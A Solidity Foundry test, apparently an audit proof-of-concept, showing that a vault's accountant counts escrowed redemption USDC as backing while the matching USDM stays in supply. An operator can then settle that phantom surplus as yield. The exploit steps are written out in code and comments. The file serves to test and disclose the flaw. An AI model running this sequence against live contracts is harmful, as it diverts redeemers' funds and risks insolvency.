// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deposit USDC to mint USDM for user1.
// 2. [T=1] user1 requests redemption of X USDM. Vault calls addObligation on RedeemEscrow. USDM is held in Vault, not burned.
// 3. [T=2] Operator calls fundRedemptions(X). Vault transfers X USDC to RedeemEscrow. Escrow balance = X, shortfall = 0.
// 4. [T=3] totalBackingSigned() counts escrow's X USDC as backing. USDM totalSupply is unchanged. surplus is inflated by X.
// 5. [T=4] distributableSurplus() = surplus - shortfall = inflated surplus.
// 6. [T=5] Operator calls settle(proposedYield = X). Gate 3 passes, phantom yield is distributed.
// 7. [Assert] Verify distributableSurplus was artificially inflated and phantom yield was settled, proving double-counting.

contract AuditAgentPoC is ToL1WeiHarness {
    function setUp() public {
        super.setUp();
    }

    function test_exploit() public {
        // 1. Setup: Deposit to get USDM
        uint256 depositAmount = 100_000e6;
        _depositAs(user1, depositAmount);

        uint256 redeemAmount = 50_000e6;

        // 2. Request redemption
        vm.startPrank(user1);
        usdm.approve(address(vault), redeemAmount);
        uint256 requestId = vault.requestRedeem(redeemAmount);
        vm.stopPrank();

        // Ensure vault has USDC to fund the redemption (in case auto-bridge moved it)
        usdc.mint(address(vault), redeemAmount);

        // 3. Fund redemptions
        vm.prank(operator);
        vault.fundRedemptions(redeemAmount);

        // 4. Check distributableSurplus
        int256 surplusAfterFunding = accountant.distributableSurplus();
        console.log("Step 4: Distributable Surplus after funding =", uint256(surplusAfterFunding));

        // The surplus is artificially inflated by redeemAmount because escrow balance is counted
        // in totalBackingSigned() but USDM supply hasn't decreased (USDM sits in Vault).
        assertGe(surplusAfterFunding, int256(redeemAmount), "Surplus should be inflated by redemption amount due to double-counting");

        // 5. Settle daily PnL with the inflated surplus
        // Advance time to pass minSettlementInterval
        uint256 minInterval = accountant.minSettlementInterval();
        vm.warp(block.timestamp + minInterval + 1);

        uint256 proposedYield = uint256(surplusAfterFunding);

        vm.prank(operator);
        vault.settle(proposedYield);

        // 6. Assert that the yield was distributed from funds that were meant for redeemers
        uint256 settledYield = accountant.totalSettledYield();
        console.log("Step 6: Total Settled Yield =", settledYield);

        assertGe(settledYield, proposedYield, "Phantom yield was settled from redemption funds");

        // Additional proof: The escrow still holds the USDC, but the accountant thinks it was "surplus"
        // and distributed it as yield. When user1 claims, the escrow pays out, but the vault's actual
        // free USDC is depleted, leading to insolvency for future operations.
        uint256 escrowBal = RedeemEscrow(payable(vault.redeemEscrow())).balance();
        assertEq(escrowBal, redeemAmount, "Escrow still holds the redemption funds");
    }
}
